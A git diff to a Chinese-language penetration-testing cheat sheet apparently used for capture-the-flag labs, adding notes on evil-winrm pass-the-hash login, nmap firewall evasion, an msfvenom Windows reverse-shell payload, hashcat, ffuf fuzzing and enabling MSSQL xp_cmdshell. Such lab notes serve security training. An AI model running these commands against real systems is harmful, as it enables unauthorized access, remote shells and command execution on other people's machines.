@@ -37,6 +37,7 @@
     - [ftp](#ftp)
     - [samba共享](#samba共享)
     - [mysql](#mysql)
+    - [mssql](#mssql)
     - [redis](#redis)
     - [other](#other)
   - [一些要记住的知识](#一些要记住的知识)
@@ -44,6 +45,9 @@
     - [CMS](#cms)
     - [手测](#手测)
     - [vHosts](#vhosts)
+    - [编码生成命令](#编码生成命令)
+    - [读取文件的命令](#读取文件的命令)
+    - [](#)
 ## WEB
 
 
@@ -142,6 +146,8 @@ docker run -v /:/mnt --rm -it <FILES> chroot /mnt sh
 windows登录工具：  
 evil-winrm -i IP -u USERNAME -p PASSWORD
 
+evil-winrm -i 10.200.60.201 -u trevor.local -H 41cb324dee3768a2777a1d640b2808a8
+
 ### john the ripper
 
 john [选项] [文件]  
@@ -187,6 +193,14 @@ sudo nmap -sSU -p 53 --script dns-nsid 10.129.2.48（测试过真正能用的）
 通常，'-sV' 与 Nmap 一起使用来确定版本，但这并不总是足够的。在这种情况下，请尝试添加“-sC”来运行安全脚本，这是获取版本等内容的另一种好方法。
 
 
+>规避防火墙
+
+sudo nmap -sSU -p 53 --script dns-nsid 10.129.2.48
+
+sudo nmap -Pn --min-rate 10000 --source-port 53  -sV 10.129.67.88 -n --disable-arp-ping
+
+
+
 ### msfvenom
 
 列出payload：  
@@ -196,6 +210,8 @@ msfvenom -l payloads
 msfvenom -p <payload> LHOST=<本地IP> LPORT=<监听端口> -f <文件类型> -o <文件名>
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.239.167 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+
 
 
 ### wireshark
@@ -263,11 +279,15 @@ j_username=brute&j_password=brute&from=%2F&Submit=Sign+in
 POST/GET后和HTTP/1.1之间是路径，user&pass(不用from和Submit),错误的回复要在页面上找
 
 ### hashcat
+识别hash类型：  
+hashcat -h HASH_FILE
 
 
-hashcat HASH_FILE
+hashcat -m <哈希类型数字> -a <攻击模式数字> HASH_FILE WORDLISTS.txt --fonts
 
-hashcat -m mode HASH_FILE WORDLISTS.txt --fonts
+-a 0 :字典破解模式
+-m 0 ：hash类型为md5
+
 
 
 ### burpsuit
@@ -316,11 +336,56 @@ sqlmap -u "URL"
 --dump | 读取指定键的值
 
 ### ffuf
-ffuf -u http://MACHINE_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
+
+>目录模糊测试
+
+ffuf -u http://MACHINE_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
 
 您也可以使用任何自定义关键字来代替FUZZ，您只需要像这样定义它 wordlist.txt:KEYWORD。
 
 ffuf -u http://MACHINE_IP/NORAJ -w /usr/share/seclists/Discovery/Web-Content/big.txt:NORAJ
+
+>页面模糊测试
+
+扩展名模糊测试
+
+ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
+
+页面模糊测试
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
+
+
+>递归模糊测试
+
+递归模糊测试：  
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+
+
+>子域模糊测试
+
+>vhost模糊
+
+>参数模糊
+
+GET:  
+
+
+POST:  
+
+>值模糊
+
+
+>参数
+
+-e 扩展名  
+可以指定多个扩展名
+
+-fc <状态码> 
+
 
 ### steghide
 
@@ -492,6 +557,11 @@ smbget -R smb://MACHINE_IP/anonymous
 
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
 
+可以列出共享：  
+smbclient -N -L //MACHINE_IP/
+
+
+
 ### mysql
 
 登录命令：  
@@ -499,6 +569,15 @@ mysql -u root -p
 
 远程登陆实例：  
 mysql -u root -h docker.hackthebox.eu -P 3306 -p 
+
+### mssql
+
+在start point机器上发现的
+
+开启xp_cmdshell
+
+exec sp_configure 'show advanced options', 1;reconfigure;
+exec sp_configure 'xp_cmdshell',1;reconfigure;
 
 
 ### redis
@@ -549,3 +628,64 @@ wpscan --url http://IP/ -e
 
 echo “10.10.10.10 exfiltrate.htb exploitserver.htb xss.vulnerablesite.htb csrf.vulnerablesite.htb” >> /etc/hosts
 
+### 编码生成命令
+
+>base64
+
+
+
+>MD5
+
+md5sum FILE
+
+>sha256
+
+sha256sum FILE
+
+### 读取文件的命令
+
+>输出到屏幕上
+
+- less
+- cat
+- tail
+- head
+- sort
+
+>编辑器
+
+- vim
+- emacs
+- nano
+- 
+
+
+
+
+>其他小工具
+
+rev：反转字符串
+
+od：输出文件的各种进制的ascii码
+
+hd:hexdump命令的缩写，输出文件的ascii码和内容
+
+xxd:给指定文件做一次16进制输出
+
+base32：对字符串或文件做base32加密并输出  
+base32 -d 可以解码base32
+
+base64：对字符串或文件做base64加密并输出  
+base64 -d 可以解码base64
+
+split：对文件进行拆分，可以拆成很多文件
+
+gzip:压缩和解压缩的工具，zcat命令可以读取压缩文件的内容
+
+
+
+
+
+
+
+### 
